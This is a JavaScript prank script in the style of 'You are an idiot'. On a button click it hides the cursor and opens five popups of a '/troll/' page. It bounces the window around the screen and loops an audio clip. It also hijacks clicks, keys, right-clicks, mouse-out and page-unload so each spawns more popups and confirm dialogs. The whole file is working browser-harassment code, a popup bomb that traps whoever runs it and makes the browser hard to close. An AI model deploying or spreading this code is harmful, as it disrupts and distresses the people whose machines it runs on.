document.querySelector('button').onclick = () => {
    document.querySelectorAll('*').forEach(a => a.style.cursor = 'none');

    let xOff = 5;
    let yOff = 5;
    let xPos = 400;
    let yPos = -100;
    let flagRun = 1;

    document.title = 'You are an idiot!';

    const openWindow = (url) => window.open(url, '_blank', 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    const proCreate = () => {
        for (let i = 0; i < 5; i++) openWindow(location.protocol + '//' + location.host + '/troll/');
    };

    function newXlt() {
        xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newXrt() {
        xOff = Math.ceil(7 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newYup() {
        yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newYdn() {
        yOff = Math.ceil(7 * Math.random()) * 5 - 10;
        window.focus();
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;

        if (xPos > screen.width - 357) newXlt();
        if (xPos < 0) newXrt();

        if (yPos > screen.height - 330) newYup();
        if (yPos < 0) newYdn();

        if (flagRun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout(() => playBall(), 1);
        }
    }

    proCreate();
    playBall();

    window.onmouseout = (e) => {
        e.preventDefault();
        if (confirm('You are an idiot')) proCreate();
        proCreate();
        return null;
    };
	
    window.oncontextmenu = (e) => {
        e.preventDefault();
        if (confirm('You are an idiot')) proCreate();
        proCreate();
        return false;
    };

    window.onkeydown = (e) => {
	    e.preventDefault();
        if (confirm('You are an idiot')) proCreate();
        proCreate();
    };

    window.onclick = (e) => {
        e.preventDefault();
        if (confirm('You are an idiot')) proCreate();
        proCreate();
        return false;
    };

    window.onbeforeunload = (e) => {
        e.preventDefault();
        proCreate();
        return true;
    };

    let overlap = false;
    let audio = new Audio('/media/youare.mp3');
    let ovlap = new Audio('/media/youare.mp3');

    function audioPlay() {
        if (!overlap) {
            audio.currentTime = 0;
            audio.play();
        } else {
            ovlap.currentTime = 0;
            ovlap.play();
        }
                
        audio.addEventListener('timeupdate', audioOverlap);
        ovlap.addEventListener('timeupdate', audioOverlap);
    }
    
    function audioOverlap() {
        if (!overlap && audio.currentTime > audio.duration - .45) {
            ovlap.currentTime = 0;
            ovlap.play();
            
            overlap = true;
        }
        
        if (overlap && ovlap.currentTime > ovlap.duration - .5) {
            audio.currentTime = 0;
            audio.play();
            
            overlap = false;
        }
    };

    audioPlay();
};
